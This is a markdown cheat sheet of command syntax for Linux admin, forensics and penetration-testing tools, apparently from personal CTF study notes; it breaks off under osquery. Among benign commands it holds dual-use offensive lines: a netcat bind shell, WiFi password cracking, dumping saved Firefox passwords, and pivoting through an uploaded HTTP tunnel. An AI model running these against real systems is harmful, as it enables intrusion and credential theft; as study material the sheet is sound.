<!-- omit from toc -->
# General Command Syntax

Instead of spending time on figuring out what arguments to use in a command each time you use it, you can look at your terminal history for what you previously used. 

<p align="center"><img alt="Reddit Programming Humor" src="https://i.redd.it/r6dfmrd3rh711.png" width="250" /></p>

However, with many different commands and terminals this can become quite difficult and time consuming. 

</br>

<h3><p align="center">\\\\====== Presenting the Command Syntax List ======////</p></h3>

</br>

Below you can find all available commands. Either select one from the ToC list or use Ctrl+F to look for it. Below the ToC there is a list of separate cheat sheets for some more complex commands.

In the commands you will find variables enclosed by `<variable>`. This simply means it needs to be replaced by your own value (e.g., `<ip>` becomes `10.10.101.81`).

### Subjects

- [Separate command sheets](#separate-command-sheets)
- [Aircrack-ng](#aircrack-ng)
- [AmcacheParser](#amcacheparser)
- [Apt](#apt)
- [Arp](#arp)
- [Auditctl](#auditctl)
- [Aureport](#aureport)
- [Ausearch](#ausearch)
- [Binwalk](#binwalk)
- [Capa](#capa)
- [cURL](#curl)
- [Df](#df)
- [Dig](#dig)
- [Dmesg](#dmesg)
- [Dpkg](#dpkg)
- [Dumpzilla.py](#dumpzillapy)
- [Enum4Linux](#enum4linux)
- [Foremost](#foremost)
- [Free](#free)
- [Gobuster](#gobuster)
- [Hostname](#hostname)
- [Hostnamectl](#hostnamectl)
- [Ifconfig](#ifconfig)
- [Iftop](#iftop)
- [Ip](#ip)
- [Iptables](#iptables)
- [Journalctl](#journalctl)
- [LECmd](#lecmd)
- [Lsblk](#lsblk)
- [Lscpu](#lscpu)
- [Lsof](#lsof)
- [MFTECmd](#mftecmd)
- [Neo-ReGeorg](#neo-regeorg)
- [Netcat](#netcat)
- [Netstat](#netstat)
- [Nmap](#nmap)
- [Nslookup](#nslookup)
- [oledump.py](#oledumppy)
- [Osquery](#osquery)
- [PECmd](#pecmd)
- [Ping](#ping)
- [Ps](#ps)
- [Pspy64](#pspy64)
- [Pstree](#pstree)
- [Route](#route)
- [RsaCTFtool](#rsactftool)
- [Rsatool](#rsatool)
- [Scalpel](#scalpel)
- [Smbclient](#smbclient)
- [Ss](#ss)
- [Systemctl](#systemctl)
- [Tcpdump](#tcpdump)
- [Top](#top)
- [Traceroute](#traceroute)
- [Uptime](#uptime)
- [Wget](#wget)
- [Whois](#whois)

<br>

## Separate command sheets

Some tools are so vast, they have many commands. Too many to include in this document whilst keeping it nice and organized. That is why I created a separate document specifically for such programs. 

🔰 Name |
-- |
**⭐[Metasploit Framework](../commands/metasploit.md)** |
**⭐[Powershell](../commands/powershell.md)** |
**** |

## Aircrack-ng

Aircrack- ng is a complete suite of tools to assess WiFi network security. More info [here](https://www.aircrack-ng.org/)

**_Crack wifi passwords from a network capture file (must include EAPOL handshake)._**

```console
aircrack-ng -w <wordlist> <capture_file>
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.pcap
```

## AmcacheParser

AmcacheParser (part of Eric Zimmerman's tools) parses the `Amcache.hve` registry hive, which records metadata about executed and installed applications on Windows systems, including file paths, hashes, and first-execution timestamps.

**_Parse the Amcache.hve file and export the results to a CSV._**

```powershell
.\AmcacheParser.exe -f "C:\Windows\appcompat\Programs\Amcache.hve" --csv C:\Users\Administrator\Desktop --csvf Amcache_Parsed.csv
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `-f` | `<path>` | Path to the Amcache.hve file |
| `--csv` | `<directory>` | Output directory for the CSV file |
| `--csvf` | `<filename>` | Output CSV file name |

</details>
<br>

More info [here](https://ericzimmerman.github.io).

## Apt

`apt` (Advanced Package Tool) handles package management on Debian-based Linux systems, including installing, updating, and removing software and their dependencies.

**_List all installed packages._**

```console
apt list --installed
```

**_List installed packages (first 30)._**

```console
apt list --installed | head -n 30
```

**_Update package lists._**

```console
sudo apt update
```

**_Search for a package._**

```console
apt search <package-name>
```

<details markdown>
<summary>Subcommands</summary>

| Subcommand | Description |
|------------|-------------|
| `list --installed` | List all installed packages |
| `update` | Refresh package index from repositories |
| `install <pkg>` | Install a package |
| `remove <pkg>` | Remove a package |
| `search <term>` | Search for packages matching term |
| `show <pkg>` | Show detailed info about a package |

</details>
<br>

## Arp

arp displays and modifies the system's ARP (Address Resolution Protocol) table, which maps IP addresses to MAC addresses on a local network.

**_Display the ARP table._**

```console
arp -a
```

**_Display the ARP table in numeric format._**

```console
arp -n
```

**_Delete an ARP entry._**

```console
sudo arp -d <ip-address>
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `-a` | - | Display all ARP entries |
| `-n` | - | Show numeric addresses instead of resolving hostnames |
| `-d` | `<ip>` | Delete the ARP entry for the specified IP |
| `-s` | `<ip> <mac>` | Add a static ARP entry |

</details>
<br>

## Auditctl

auditctl is used to control the Linux audit system. It configures audit rules that define which system calls, file accesses, and user activities are logged by `auditd`. Rules added with `auditctl` are temporary; for persistent rules, edit `/etc/audit/audit.rules`.

**_Watch a file for read, write, and attribute changes._**

```console
sudo auditctl -w /etc/passwd -p wra -k users
```

**_Log all program executions via execve syscall (64-bit)._**

```console
sudo auditctl -a always,exit -F arch=b64 -S execve -k execve_syscalls
```

**_List all active audit rules._**

```console
sudo auditctl -l
```

**_Delete all active audit rules._**

```console
sudo auditctl -D
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `-w` | `<path>` | Watch a file or directory |
| `-p` | `rwxa` | Permissions to watch: r=read, w=write, x=execute, a=attribute |
| `-k` | `<key>` | Tag rule events with a searchable key name |
| `-a` | `always,exit` | Append rule: always log on syscall exit |
| `-F` | `arch=b64` | Filter: apply to 64-bit architecture |
| `-S` | `<syscall>` | Syscall to monitor (e.g. execve, open) |
| `-l` | - | List all current rules |
| `-D` | - | Delete all rules |

</details>
<br>

## Aureport

aureport generates summary reports from the Linux audit log. It is typically used by piping output from `ausearch` to produce structured, human-readable reports of audit events.

**_Generate a summary report of file events._**

```console
sudo ausearch -k users | aureport -f --summary
```

**_Generate a named file report._**

```console
sudo ausearch -k users | aureport -f user-logs
```

**_Generate a report of all authentication events._**

```console
sudo aureport --auth
```

**_Generate a report of executable events._**

```console
sudo aureport --executable
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `-f` | - | Generate a file access report |
| `--summary` | - | Produce a summary report |
| `--auth` | - | Report on authentication events |
| `--executable` | - | Report on executable events |
| `--login` | - | Report on login events |
| `--user` | - | Report on user-related events |
| `--failed` | - | Show only failed events |

</details>
<br>

## Ausearch

ausearch queries the Linux audit log (`/var/log/audit/audit.log`) for events matching specified criteria such as rule keys, usernames, or syscalls.

**_Search by audit rule key._**

```console
sudo ausearch -k <key>
sudo ausearch -k users
sudo ausearch -k execve_syscalls
```

**_Search by username._**

```console
sudo ausearch -ua <username>
```

**_Search within a time range._**

```console
sudo ausearch --start today
sudo ausearch --start "01/01/2024 00:00:00" --end "01/02/2024 00:00:00"
```

**_Pipe to aureport for a structured report._**

```console
sudo ausearch -k users | aureport -f --summary
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `-k` | `<key>` | Search by audit rule key tag |
| `-ua` | `<username>` | Search by username |
| `-ui` | `<uid>` | Search by user ID |
| `--start` | `today` / `<date>` | Start of time range |
| `--end` | `<date>` | End of time range |
| `-f` | `<file>` | Search events related to a specific file |
| `-sc` | `<syscall>` | Search by syscall name |

</details>
<br>

## Binwalk



**_List and extract known files_**

```console
binwalk -e Challenge2_slack_space.img
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `-e` | - | `Automatically extract known file types` |

</details>
<br>

More info [here](tools_and_resources.md).

## Capa

Capa is the FLARE team's free and open-source tool to identify capabilities in executable files.

**_Analyse a bin file._**

```console
capa.exe .\cryptbot.bin
```

**_Log more detailed information._**

```console
capa -vv .\cryptbot.bin
```

**_Log more detailed information and direct the result to a .json file._**

```console
capa.bin -j -vv .\cryptbot.bin > cryptbot_vv.json
```


## cURL

curl transfers data from or to a server using various protocols (HTTP, HTTPS, FTP, etc.). Useful for testing network connections, downloading files, and interacting with web APIs.

**_Basic GET request_**

```console
curl <ip/hostname>
```

**_Basic POST request for a login form._**

```console
curl -X POST -d "username=user&password=user&submit=Login" http://10.80.184.173/post.php
```

**_Download a file._**

```console
curl -O <url>
curl -O https://example.com/file.txt
```

**_Save output to a specific filename._**

```console
curl -o <filename> <url>
```

**_Send a GET request and print the response._**

```console
curl <url>
```

**_Send a POST request with data._**

```console
curl -X POST -d "param=value" <url>
```

**_Use through a SOCKS5 proxy._**

```console
curl --socks5 127.0.0.1:1080 <url>
```

**_Follow redirects._**

```console
curl -L <url>
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `-i` | - | To view exactly what the server returns (including headers and potential redirects). |
| `-O` | - | Save to a file with the remote filename |
| `-o` | `<file>` | Save to a specified local filename |
| `-X` | `POST/GET/PUT` | Specify the HTTP method |
| `-d` | `<data>` | Send data in a POST request |
| `-H` | `<header>` | Add a custom HTTP header |
| `-A` | `<user-agent>` | Specify a custom user-agent. |
| `-c` | `<filename>` | Writes any cookies received from the server into a file. |
| `-b` | `<filename>` | Send the saved cookies in the next request. |
| `-L` | - | Follow redirects |
| `-s` | - | Silent mode (no progress bar) |
| `--socks5` | `<host:port>` | Route traffic through a SOCKS5 proxy |
| `-v` | - | Verbose output (useful for debugging) |

</details>
<br>

## Df

df reports the amount of disk space used and available on filesystems.

**_Display disk usage in human-readable format._**

```console
df -h
```

**_Display disk usage for a specific path._**

```console
df -h /home
```

**_Show inode usage instead of block usage._**

```console
df -i
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `-h` | - | Human-readable sizes (KB, MB, GB) |
| `-H` | - | Human-readable using powers of 1000 instead of 1024 |
| `-i` | - | Show inode usage instead of block usage |
| `-T` | - | Show filesystem type |
| `<path>` | - | Limit output to the filesystem containing the specified path |

</details>
<br>

## Dig

dig (Domain Information Groper) queries DNS servers for information about domain names. Useful for diagnosing DNS-related issues and gathering DNS records.

**_Query DNS records for a domain._**

```console
dig <domain>
dig tryhackme.com
```

**_Query a specific DNS server._**

```console
dig @<dns-server> <domain>
dig @1.1.1.1 tryhackme.com
```

**_Query a specific record type._**

```console
dig <domain> <type>
dig tryhackme.com MX
dig tryhackme.com TXT
```

**_Perform a DNS zone transfer._**

```console
dig -t AXFR <domain> @<dns-server>
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `@<server>` | - | Use a specific DNS server |
| `-t` | `AXFR/A/MX/TXT` | Query type (default: A record) |
| `+short` | - | Return only the answer, no extra output |
| `+noall +answer` | - | Show only the answer section |
| `-x` | `<ip>` | Reverse DNS lookup |

</details>
<br>

## Dmesg

dmesg prints and controls the kernel ring buffer — a circular log of messages generated by the kernel. Useful for detecting hardware events, unusual module loads, and signs of kernel-level tampering.

**_View the kernel ring buffer._**

```console
sudo dmesg
```

**_View with human-readable timestamps._**

```console
sudo dmesg -T
```

**_Filter output by keyword._**

```console
sudo dmesg -T | grep '<keyword>'
sudo dmesg -T | grep 'custom_kernel'
```

**_Follow new messages in real time._**

```console
sudo dmesg -w
```

**_View the persistent kernel log file._**

```console
cat /var/log/kern.log
tail -f /var/log/kern.log
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `-T` | - | Print timestamps in human-readable format |
| `-w` | - | Follow/watch for new messages in real time |
| `-l` | `err,warn` | Filter by log level (emerg, alert, crit, err, warn, notice, info, debug) |
| `-f` | `kern` | Filter by facility (kern, user, daemon, etc.) |
| `-H` | - | Human-readable output with color and relative timestamps |
| `--clear` | - | Clear the ring buffer |

</details>
<br>

## Dpkg

dpkg is the low-level package management tool for Debian-based systems. It installs, removes, and provides information about `.deb` packages directly, without handling dependencies.

**_List all installed packages._**

```console
dpkg -l
```

**_List installed packages filtered by name._**

```console
dpkg -l | grep <package-name>
```

**_Show detailed info about an installed package._**

```console
dpkg -s <package-name>
```

**_List files installed by a package._**

```console
dpkg -L <package-name>
```

**_Find which package owns a file._**

```console
dpkg -S <file-path>
dpkg -S /usr/bin/python3
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `-l` | - | List all installed packages |
| `-s` | `<pkg>` | Show package status and details |
| `-L` | `<pkg>` | List files installed by the package |
| `-S` | `<file>` | Find which package a file belongs to |
| `-i` | `<.deb>` | Install a .deb package file |
| `-r` | `<pkg>` | Remove a package |

</details>
<br>

## Dumpzilla.py

DumpZilla is a forensic tool for extracting data from Firefox browser profiles. It can retrieve cookies, passwords, bookmarks, history, downloads, and other browser artifacts.

**_Extract all available data from a Firefox profile._**

```console
sudo python3 dumpzilla.py /home/<user>/.mozilla/firefox/<profile>/ --All
```

**_Extract bookmarks only._**

```console
sudo python3 dumpzilla.py /home/<user>/.mozilla/firefox/<profile>/ --Bookmarks
```

**_Extract cookies and saved passwords._**

```console
sudo python3 dumpzilla.py /home/<user>/.mozilla/firefox/<profile>/ --Cookies --Passwords
```

The Firefox profile path is typically `~/.mozilla/firefox/<profile>/`. Profile name can be found in `~/.mozilla/firefox/profiles.ini`.

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `--All` | - | Extract all available data |
| `--Bookmarks` | - | Extract saved bookmarks |
| `--Cookies` | - | Extract browser cookies |
| `--Passwords` | - | Extract saved passwords |
| `--History` | - | Extract browsing history |
| `--Downloads` | - | Extract download history |
| `--Addons` | - | List installed extensions/add-ons |

</details>
<br>

More info [here](https://github.com/Busindre/dumpzilla).

## Enum4Linux

enum4Linux is a Linux alternative to enum.exe for enumerating data from Windows and Samba hosts.

More info [here](https://github.com/CiscoCXSecurity/enum4linux).

## Foremost

foremost recovers files from a disk image based on their headers, footers, and internal data structures (file carving), without relying on filesystem metadata. Commonly used to recover deleted files.

**_Carve specific file types out of a disk image using a custom configuration file._**

```console
foremost -t pdf,jpg,png -i Challenge3_deleted_disk.img -o Challenge3_files -c /etc/custom_foremost.conf
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `-t` | `pdf,jpg,png` | File types to search for and recover |
| `-i` | `<image>` | Input file/disk image to carve |
| `-o` | `<directory>` | Output directory for recovered files |
| `-c` | `<config>` | Path to a custom configuration file |
| `-a` | - | Write all headers, perform no error detection (may result in corrupted files) |

</details>
<br>

More info [here](http://foremost.sourceforge.net/).

## Free

free displays the total amount of physical and swap memory in the system, including what is used, free, and available.

**_Display memory usage in human-readable format._**

```console
free -h
```

**_Display memory in megabytes._**

```console
free -m
```

**_Continuously update every N seconds._**

```console
free -h -s <seconds>
free -h -s 2
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `-h` | - | Human-readable sizes (KB, MB, GB) |
| `-m` | - | Display in megabytes |
| `-g` | - | Display in gigabytes |
| `-s` | `<sec>` | Continuously display, updating every N seconds |
| `-t` | - | Show a totals line |

</details>
<br>

## Gobuster

Gobuster is a software tool for brute forcing directories on web servers. It comes preinstalled with Kali Linux, a Linux distribution designed for digital forensics and penetration testing.

**_Enumerate common files in directories_**

```console
gobuster dir -u http://TARGET_IP:80 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -x bak,txt,html -t 20
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `dir` | -| Mode — use directory/file enumeration |
| `-u` | `http://TARGET_IP:80` | Target URL including port |
| `-w` | `common.txt` | Wordlist to use for brute-forcing paths |
| `-x` | `bak,txt,html` | File extensions to append to each wordlist entry |
| `-t` | `20` | Number of concurrent threads |

</details>
<br>

More info [here](https://github.com/OJ/gobuster).

## Hostname

hostname displays or sets the hostname of the system. It is useful for identifying the local system's network identity.

**_Display the current hostname._**

```console
hostname
```

**_Display the system's IP address._**

```console
hostname -I
```

**_Display the fully qualified domain name (FQDN)._**

```console
hostname -f
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `-I` | - | Display all IP addresses of the host |
| `-f` | - | Display the fully qualified domain name |
| `-s` | - | Display the short hostname (up to the first dot) |
| `-d` | - | Display the DNS domain name |

</details>
<br>

## Hostnamectl

hostnamectl queries and changes the system hostname and related settings. It provides more detail than `hostname`, including machine ID, OS, kernel version, and virtualisation type.

**_Display all hostname and system information._**

```console
hostnamectl
```

**_Set the system hostname._**

```console
sudo hostnamectl set-hostname <new-hostname>
```

<details markdown>
<summary>Subcommands</summary>

| Subcommand | Description |
|------------|-------------|
| *(no subcommand)* | Display hostname, machine ID, OS, kernel, architecture |
| `set-hostname <name>` | Set the static hostname |
| `set-icon-name <name>` | Set the icon name (chassis type) |

</details>
<br>

## Ifconfig

ifconfig configures and displays information about network interfaces. Largely replaced by `ip` in modern Linux systems, but still widely available.

**_Display all network interfaces._**

```console
ifconfig
```

**_Display a specific interface._**

```console
ifconfig <interface>
ifconfig eth0
```

**_Bring an interface up or down._**

```console
sudo ifconfig <interface> up
sudo ifconfig <interface> down
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `<interface>` | `eth0` | Show info for a specific interface |
| `up` / `down` | - | Enable or disable an interface |
| `-a` | - | Show all interfaces including inactive ones |

</details>
<br>

> **Note:** `ip a` is the modern equivalent and preferred in current Linux distributions.

## Iftop

iftop provides a real-time display of bandwidth usage on a network interface, showing which connections are using the most bandwidth.

**_Monitor bandwidth on the default interface._**

```console
sudo iftop
```

**_Monitor a specific interface._**

```console
sudo iftop -i <interface>
sudo iftop -i eth0
```

**_Show port numbers._**

```console
sudo iftop -P
```

**_Run in non-interactive mode and output to a file._**

```console
sudo iftop -t -s <seconds> > output.txt
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `-i` | `<interface>` | Monitor a specific network interface |
| `-P` | - | Show port numbers in output |
| `-n` | - | Do not resolve hostnames (show IPs only) |
| `-N` | - | Do not resolve port names |
| `-t` | - | Use text mode (non-interactive) |
| `-s` | `<seconds>` | Run for N seconds then exit (use with -t) |

</details>
<br>

## Ip

ip is the modern, versatile replacement for `ifconfig` and `route`. It configures network interfaces, routing, tunnels, and more.

**_Display all network interfaces and IP addresses._**

```console
ip a
ip address show
```

**_Display a specific interface._**

```console
ip a show <interface>
ip a show eth0
```

**_Display the routing table._**

```console
ip r
ip route show
```

**_Display ARP/neighbour table._**

```console
ip neigh
```

**_Bring an interface up or down._**

```console
sudo ip link set <interface> up
sudo ip link set <interface> down
```

<details markdown>
<summary>Subcommands</summary>

| Subcommand | Description |
|------------|-------------|
| `ip a` / `ip address` | Show/configure IP addresses |
| `ip r` / `ip route` | Show/configure routing table |
| `ip link` | Show/configure network interfaces |
| `ip neigh` | Show/modify ARP/neighbour table |
| `ip tunnel` | Configure IP tunnels |

</details>
<br>

## Iptables

iptables displays, sets up, and maintains IP packet filter rules. It is used to manage firewall rules and monitor network traffic on Linux systems.

**_List all active rules._**

```console
sudo iptables -L
sudo iptables -L -v -n
```

**_Allow incoming traffic on a port._**

```console
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
```

**_Allow outgoing traffic on a port._**

```console
sudo iptables -A OUTPUT -p tcp --dport 22 -j ACCEPT
```

**_Block traffic from an IP._**

```console
sudo iptables -A INPUT -s <ip> -j DROP
```

**_Save and restore rules._**

```console
sudo iptables-save > /etc/iptables/rules.v4
sudo iptables-restore < /etc/iptables/rules.v4
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `-L` | - | List all rules in the selected chain |
| `-v` | - | Verbose output |
| `-n` | - | Numeric output (no DNS resolution) |
| `-A` | `INPUT/OUTPUT/FORWARD` | Append a rule to a chain |
| `-D` | `<chain> <rule>` | Delete a rule |
| `-F` | - | Flush (delete) all rules |
| `-p` | `tcp/udp/icmp` | Protocol to match |
| `--dport` | `<port>` | Destination port |
| `-s` | `<ip>` | Source IP address |
| `-j` | `ACCEPT/DROP/REJECT` | Target action |

</details>
<br>

## Journalctl

journalctl is the command-line utility for querying and displaying messages from the systemd journal. Used in forensics to investigate service logs and detect malicious activity.

**_Follow (tail) logs for a specific service in real time._**

```console
sudo journalctl -f -u <service-name>
```

**_View all journal logs for a specific service._**

```console
journalctl -u <service-name>
```

**_View logs since a relative or absolute timestamp._**

```console
journalctl --since "1 hour ago"
journalctl --since "2024-01-01 00:00:00"
```

**_View logs between two timestamps._**

```console
journalctl --since "08:00" --until "12:00"
```

**_Show logs from the current boot only._**

```console
journalctl -b
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `-f` | - | Follow — stream new log entries in real time |
| `-u` | `<service-name>` | Filter by systemd unit/service name |
| `--since` | `"1 hour ago"` | Show entries after this timestamp |
| `--until` | `"2024-01-01"` | Show entries before this timestamp |
| `-n` | `<number>` | Show the last N lines |
| `-p` | `err` | Filter by priority (emerg, alert, crit, err, warning, notice, info, debug) |
| `-b` | - | Show logs from the current boot |

</details>
<br>

## LECmd

LECmd (part of Eric Zimmerman's tools) parses Windows LNK (shortcut) files, which are automatically created when a user opens a file. LNK files reveal recently accessed items, including for files that have since been deleted.

**_Parse all LNK files in a directory and export the results to a CSV._**

```powershell
.\LECmd.exe -d C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent --csvf Parsed-LNK.csv --csv C:\Users\Administrator\Desktop
```

**_Parse a single LNK file._**

```powershell
LECmd.exe -f <path to file>
```

LNK files are typically found under `%userprofile%\AppData\Roaming\Microsoft\Windows\Recent` and `%userprofile%\recent`.

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `-d` | `<directory>` | Directory containing LNK files to parse |
| `-f` | `<file>` | Parse a single LNK file instead of a directory |
| `--csv` | `<directory>` | Output directory for the CSV file |
| `--csvf` | `<filename>` | Output CSV file name |

</details>
<br>

More info [here](https://ericzimmerman.github.io).

## Lsblk

lsblk lists information about block devices (disks and partitions), including their sizes, mount points, and type.

**_List all block devices._**

```console
lsblk
```

**_Show filesystem type and UUID._**

```console
lsblk -f
```

**_Show all columns including permissions._**

```console
lsblk -o NAME,SIZE,TYPE,MOUNTPOINT,FSTYPE,UUID
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `-f` | - | Show filesystem type, UUID, and label |
| `-o` | `<columns>` | Specify output columns |
| `-d` | - | Do not show slave/holder devices |
| `-n` | - | Do not print header |
| `-J` | - | Output in JSON format |

</details>
<br>

## Lscpu

lscpu displays detailed information about the CPU architecture, including the number of cores, threads, speed, and vendor.

**_Display CPU architecture information._**

```console
lscpu
```

**_Output in JSON format._**

```console
lscpu -J
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `-J` | - | Output in JSON format |
| `-p` | - | Output in parseable (CSV-like) format |
| `-e` | - | Extended readable format |
| `--all` | - | Include all CPUs including offline ones |

</details>
<br>

## Lsof

lsof (LiSt Open Files) lists information about files opened by processes. Since everything in Linux is treated as a file, this includes regular files, directories, network sockets, and devices — making it extremely powerful for spotting suspicious behavior.

**_List all open files and the processes that opened them._**

```console
lsof
```

**_List all open files for a specific process by PID._**

```console
sudo lsof -p <PID>
```

**_List open network connections._**

```console
lsof -i
```

**_List open connections on a specific port._**

```console
lsof -i :<port>
lsof -i :4444
```

**_List all open files for a specific user._**

```console
lsof -u <username>
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `-p` | `<PID>` | Filter by process ID |
| `-i` | `:<port>` | Show network connections, optionally filtered by port |
| `-u` | `<username>` | Filter by user |
| `-c` | `<name>` | Filter by process name |
| `+D` | `<directory>` | Show all open files under a directory |
| `-t` | - | Return only PIDs (useful for piping) |

</details>
<br>

## MFTECmd

Command-line tool for parsing the NTFS Master File Table ($MFT), $J, and other NTFS metadata files.

**_Extract the records from the Files and save it in the same folder_**

```console
MFTECmd.exe -f ..\Evidence\$MFT --csv ..\Evidence --csvf ..\Evidence\MFT_record.csv
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `-f` | `..\Evidence\$MFT` | `MFT file location` |
| `--csv` | `..\Evidence` | `Output directory` |
| `--csvf` | `..\Evidence\MFT_record.csv` | `Output file name` |

</details>
<br>

More info [here](https://ericzimmerman.github.io).

## Neo-ReGeorg

Neo-reGeorg is an HTTP tunneling and pivot tool that can create a tunnel over the HTTP(S) protocol. It encapsulates other protocols and sends them back and forth via the HTTP protocol. Create an HTTP tunnel communication channel to pivot into the internal network and communicate with local network devices through HTTP protocol. It is used for proxying HTTP traffic when encountering servers that do not allow internet access during traffic proxying.

**_Generate a Neo-ReGeorg key_**

```console
python3 neoreg.py generate -k <password> 
```

**_Connect to the tunnel (must be uploaded to the machine)._**

```console
python3 neoreg.py -k thm -u http://10.10.230.138/uploader/files/tunnel.php
```

Connect to a machine behind the webserver through the tunnel curl, proxychains, FoxyProxy, Firefox, etc.

```console
curl --socks5 127.0.0.1:1080 <address of machine / file>
curl --socks5 127.0.0.1:1080 http://172.20.0.120:80/flag
```

More info [here](https://github.com/L-codes/Neo-reGeorg/blob/master/README-en.md).

## Netcat

netcat (nc) reads and writes data across network connections using TCP or UDP. It is a versatile tool for debugging, testing network connections, and creating bind or reverse shells.

**_Set up a listener on a port._**

```console
nc -nlvp <port>
nc -nlvp 4444
```

**_Connect to a remote host and port._**

```console
nc <ip> <port>
```

**_Transfer a file (receiver side)._**

```console
nc -nlvp <port> > received_file.txt
```

**_Transfer a file (sender side)._**

```console
nc <ip> <port> < file_to_send.txt
```

**_Create a bind shell (on target)._**

```console
nc -nlvp <port> -e /bin/bash
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `-l` | - | Listen mode |
| `-n` | - | Do not resolve hostnames (numeric only) |
| `-v` | - | Verbose output |
| `-p` | `<port>` | Specify local port |
| `-e` | `<cmd>` | Execute command after connection (may not be available in all builds) |
| `-u` | - | Use UDP instead of TCP |
| `-w` | `<seconds>` | Timeout for idle connections |

</details>
<br>

## Netstat

netstat displays network connections, routing tables, interface statistics, and more. Largely replaced by `ss` in modern systems but still widely encountered.

**_Show all active connections._**

```console
netstat -a
```

**_Show listening ports and services._**

```console
netstat -tlun
```

**_Show connections with PIDs._**

```console
sudo netstat -tlunp
```

**_Show the routing table._**

```console
netstat -r
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `-a` | - | Show all sockets (listening and non-listening) |
| `-t` | - | Show TCP connections |
| `-u` | - | Show UDP connections |
| `-l` | - | Show only listening sockets |
| `-n` | - | Show numeric addresses (no DNS resolution) |
| `-p` | - | Show PID and program name |
| `-r` | - | Show routing table |

</details>
<br>

> **Note:** `ss` is the modern equivalent and preferred on current Linux distributions.

## Nmap

nmap scans networks to discover hosts and services. Useful for identifying devices on a network, open ports, running services, and OS versions.

**_Basic scan of a host._**

```console
nmap <ip>
```

**_Fast scan of the most common ports._**

```console
nmap -F <ip>
```

**_Scan a specific port range._**

```console
nmap -p <port-range> <ip>
nmap -p 1-1000 <ip>
```

**_Service and version detection._**

```console
nmap -sV <ip>
```

**_OS detection._**

```console
sudo nmap -O <ip>
```

**_Full scan with service/OS detection and scripts._**

```console
sudo nmap -A <ip>
```

**_Scan without sending ICMP ping (useful when ICMP is blocked)._**

```console
nmap -Pn <ip>
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `-sS` | - | SYN (stealth) scan |
| `-sV` | - | Service/version detection |
| `-O` | - | OS detection (requires root) |
| `-A` | - | Aggressive scan (OS, version, scripts, traceroute) |
| `-p` | `<range>` | Port range to scan |
| `-F` | - | Fast mode — scan fewer ports |
| `-Pn` | - | Skip host discovery (treat all hosts as up) |
| `--ttl` | `<n>` | Set IP TTL value |
| `--badsum` | - | Send packets with bad checksum (firewall testing) |

</details>
<br>

## Nslookup

nslookup queries DNS servers to obtain domain name or IP address mappings. Useful for diagnosing DNS issues.

**_Look up a domain name._**

```console
nslookup <domain>
nslookup tryhackme.com
```

**_Reverse lookup — find the hostname for an IP._**

```console
nslookup <ip>
```

**_Query a specific DNS server._**

```console
nslookup <domain> <dns-server>
nslookup tryhackme.com 8.8.8.8
```

**_Query a specific record type._**

```console
nslookup -type=MX <domain>
nslookup -type=TXT <domain>
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `-type` | `A/MX/TXT/NS/PTR` | Query a specific DNS record type |
| `<dns-server>` | `8.8.8.8` | Use a specific DNS server |

</details>
<br>

## oledump.py

Oledump.py is a Python tool that analyzes OLE2 files, commonly called Structured Storage or Compound File Binary Format. OLE stands for Object Linking and Embedding, a proprietary technology developed by Microsoft. 

**_Analyse a file and investigate the 4th datastream. Then decompress any VBA code._**

```console
oledump.py agenttesla.xlsm -s 4 --vbadecompress
```

**_Firefox_**

Configure a manual proxy in the network setting and use the ip and port as listed in the Neo-reGeorge CLI output for the SOCKS host.

## Osquery

osquery exposes the operating system as a relational database, allowing you to query system information using SQL. Useful for forensics, introspection, and endpoint monitoring.

**_Launch the interactive osquery shell._**

```console
osqueryi
```

**_Query running processes._**

```console
SELECT pid, name, path, cmdline, state FROM processes;
```

**_Query listening ports._**

```console
SELECT pid, port, protocol FROM listening_ports;
```

**_Query installed packages._**

```console
SELECT name, version FROM deb_packages;
```

**_Query user accounts._**

```console
SELECT username, uid, gid, shell FROM users;
```

**_Processes Running From the tmp Directory_**

```console
